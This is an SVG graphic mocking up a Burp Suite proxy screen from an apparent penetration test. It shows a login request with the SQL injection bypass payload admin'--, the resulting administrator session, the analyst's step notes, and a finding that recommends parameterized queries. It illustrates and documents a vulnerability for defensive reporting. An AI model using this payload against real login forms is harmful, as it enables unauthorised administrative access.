<svg viewBox="0 0 860 580" xmlns="http://www.w3.org/2000/svg" font-family="'JetBrains Mono', 'Courier New', monospace">
  <defs>
    <style>
      .win-bg { fill: #1f2229; }
      .titlebar { fill: #2b303b; }
      .sidebar { fill: #252932; }
      .panel { fill: #1a1e26; }
      .accent { fill: #ff6633; }
      .hdr { fill: #e8e8e8; font-weight: bold; }
      .val-ok { fill: #3fb950; }
      .val-warn { fill: #d29922; }
      .val-err { fill: #f85149; }
      .val-dim { fill: #8b949e; }
      .label { fill: #c9d1d9; }
      .highlighted { fill: rgba(255,102,51,0.15); }
    </style>
  </defs>

  <!-- Window -->
  <rect width="860" height="580" rx="10" class="win-bg" />
  <rect width="860" height="38" rx="10" class="titlebar" />
  <rect y="28" width="860" height="10" class="titlebar" />

  <!-- Traffic lights -->
  <circle cx="22" cy="19" r="6" fill="#ff5f57" />
  <circle cx="42" cy="19" r="6" fill="#febc2e" />
  <circle cx="62" cy="19" r="6" fill="#28c840" />

  <!-- Burp Suite header bar -->
  <text x="430" y="24" text-anchor="middle" fill="#ff6633" font-size="13" font-weight="bold">Burp Suite Professional — HTTP Proxy Intercept</text>

  <!-- Tab bar -->
  <rect x="0" y="38" width="860" height="28" fill="#2b303b"/>
  <rect x="0" y="38" width="90" height="28" fill="#1f2229" rx="4"/>
  <text x="45" y="56" text-anchor="middle" fill="#ff6633" font-size="11" font-weight="bold">Intercept</text>
  <text x="140" y="56" text-anchor="middle" fill="#8b949e" font-size="11">HTTP history</text>
  <text x="225" y="56" text-anchor="middle" fill="#8b949e" font-size="11">WebSockets</text>

  <!-- Toggle button simulation -->
  <rect x="700" y="42" width="140" height="20" rx="4" fill="#ff6633"/>
  <text x="770" y="56" text-anchor="middle" fill="#fff" font-size="11" font-weight="bold">Intercept is ON</text>

  <!-- Intercepted request panel -->
  <rect x="10" y="75" width="840" height="240" rx="6" class="panel" />
  <text x="20" y="92" fill="#58a6ff" font-size="11" font-weight="bold">▶ Intercepted Request (click Forward to send | Drop to discard)</text>
  <line x1="10" y1="97" x2="850" y2="97" stroke="#30363d" stroke-width="1"/>

  <!-- Request content -->
  <text x="20" y="114" class="val-warn" font-size="11">POST /login HTTP/1.1</text>
  <text x="20" y="130" class="label" font-size="11">Host: app.corp-internal.com</text>
  <text x="20" y="146" class="label" font-size="11">Content-Type: application/x-www-form-urlencoded</text>
  <text x="20" y="162" class="label" font-size="11">Cookie: session=abc123def456; PHPSESSID=xyz789</text>
  <text x="20" y="178" class="label" font-size="11">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)</text>
  <text x="20" y="194" class="label" font-size="11">Content-Length: 68</text>
  <text x="20" y="210" class="label" font-size="11"> </text>

  <!-- Highlighted payload -->
  <rect x="10" y="215" width="840" height="22" class="highlighted"/>
  <text x="20" y="230" class="val-err" font-size="11">username=admin'--+&amp;password=anything&amp;remember=true   ← SQL injection payload</text>

  <!-- Annotations -->
  <rect x="590" y="113" width="250" height="95" rx="4" fill="rgba(88,166,255,0.08)" stroke="#58a6ff" stroke-width="1"/>
  <text x="600" y="128" fill="#58a6ff" font-size="10" font-weight="bold">ANALYST ANNOTATIONS</text>
  <text x="600" y="144" class="val-dim" font-size="10">1. Captured login POST in proxy</text>
  <text x="600" y="159" class="val-dim" font-size="10">2. Modified username field to:</text>
  <text x="600" y="174" class="val-warn" font-size="10">   admin'-- (classic SQLi bypass)</text>
  <text x="600" y="189" class="val-dim" font-size="10">3. Forward to observe response</text>
  <text x="600" y="204" class="val-dim" font-size="10">   200 OK = auth bypass confirmed</text>

  <!-- Response panel -->
  <rect x="10" y="325" width="840" height="160" rx="6" class="panel" />
  <text x="20" y="342" fill="#3fb950" font-size="11" font-weight="bold">▶ Server Response (after forwarding payload)</text>
  <line x1="10" y1="347" x2="850" y2="347" stroke="#30363d" stroke-width="1"/>

  <text x="20" y="364" class="val-ok" font-size="11">HTTP/1.1 302 Found</text>
  <text x="20" y="380" class="label" font-size="11">Location: /dashboard</text>
  <text x="20" y="396" class="val-err" font-size="11">Set-Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...  ← admin session minted!</text>
  <text x="20" y="412" class="label" font-size="11">X-Auth-Role: administrator</text>
  <text x="20" y="428" class="label" font-size="11">Content-Length: 0</text>

  <!-- Finding callout -->
  <rect x="10" y="497" width="840" height="74" rx="6" fill="rgba(248,81,73,0.10)" stroke="#f85149" stroke-width="1"/>
  <text x="25" y="515" class="val-err" font-size="12" font-weight="bold">🔴 CONFIRMED: SQL Injection Authentication Bypass (CWE-89, CVSS 9.1)</text>
  <text x="25" y="533" class="label" font-size="11">Proof: admin'-- comment terminates SQL WHERE clause → query returns first row (admin) regardless of password.</text>
  <text x="25" y="549" class="label" font-size="11">Evidence: HTTP 302 → /dashboard with administrator token. Capture request/response pair for the pentest report.</text>
  <text x="25" y="565" class="label" font-size="11">Fix: Parameterized queries (prepared statements). Do not concatenate user input into SQL strings.</text>
</svg>